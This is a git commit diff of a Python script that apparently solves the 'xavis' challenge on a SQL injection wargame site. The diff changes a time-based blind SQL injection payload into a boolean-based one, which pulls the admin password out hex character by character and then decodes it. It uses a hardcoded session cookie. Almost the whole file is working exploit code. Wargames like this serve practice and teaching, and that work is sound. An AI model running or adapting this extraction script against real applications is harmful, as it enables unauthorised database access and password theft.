491e020d28961b23172c5c449b4379663d2b53c8
Rohit Narayanan M <rohitnanu.m@gmail.com>
2021-05-27 00:54:36 +0530

    xavis

--- xavis.py
+++ xavis.py
@@ -1,17 +1,20 @@
 import requests
 import string
+import codecs
 
 session = requests.Session()
 
-url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or id='admin' and if((ord(substr(pw,{},1))={}),sleep(5),null);%23"
-cookies = {"PHPSESSID": "tqlf4m3teeel2nlo0lv61671fc"}
+url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or (ord(substr(hex(pw),{},1))={});%23"
+cookies = {"PHPSESSID": "97ghjrfm38d8a8k1o1edj31qv3"}
 pw=''
-for j in range(1,8):
-    for i in string.printable:
-        r = requests.get(url.format(j,ord(i)), cookies=cookies)
-        print(r.elapsed.total_seconds())
-        if(r.elapsed.total_seconds()>5):
-            pw += i
+for i in range(1,19):
+    for j in "0123456789ABCDEF":
+        print(i,url.format(i,ord(j)))
+        r = requests.get(url.format(i,ord(j)), cookies=cookies)
+        if('Hello admin' in r.text[:200]):
+            pw += j
             print("Password :", pw)
             break
 print("Password :", pw)
+x=codecs.decode(pw, "hex").decode('utf-8')
+print(x)
